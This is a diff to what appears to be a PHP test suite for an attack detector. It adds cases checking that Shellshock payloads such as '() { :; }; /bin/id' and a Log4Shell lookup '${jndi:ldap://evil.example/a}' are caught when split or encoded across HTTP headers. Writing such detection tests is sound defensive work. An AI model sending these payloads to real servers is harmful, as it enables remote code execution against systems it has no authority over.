@@ -174,6 +174,9 @@ return [
             ['/', ['HTTP_ACCEPT' => 'text/html', 'HTTP_X_API_VERSION' => '() { :; }'], 'ATK-SHELLSHOCK'],   // a later header's value
             ['/', ['CONTENT_TYPE' => '() { :; }; /bin/id'], 'ATK-SHELLSHOCK'],                          // Content-Type: PHP keeps it without HTTP_
             ['/', ['HTTP_X_A' => 'x/*', 'HTTP_X_B' => '() { :; }; id', 'HTTP_X_C' => '*/'], 'ATK-SHELLSHOCK'],   // a comment cannot reach across headers
+            ['/', ['HTTP_X_A' => 'x/%2a', 'HTTP_X_B' => '() { :; }; /bin/id', 'HTTP_X_C' => '*/'], 'ATK-SHELLSHOCK'],   // nor one that decoding makes
+            ['/', ['HTTP_X_A' => 'x%%32%66*', 'HTTP_X_B' => '() { :; }; /bin/id', 'HTTP_X_C' => '*/'], 'ATK-SHELLSHOCK'],   // nor one the second decoding makes
+            ['/', ['HTTP_X_A' => 'x/%2A', 'HTTP_X_API' => '${jndi:ldap://evil.example/a}', 'HTTP_X_C' => '*/'], 'ATK-JNDI'],   // anywhere takes the headers so too
             ['/', ['HTTP_REFERER' => '%28%29%20%7B%20%3A%3B%20%7D%3B%20id'], 'ATK-SHELLSHOCK'],   // percent-encoded: decoded as everywhere
         ];
         foreach ($cases as [$uri, $server, $id]) {
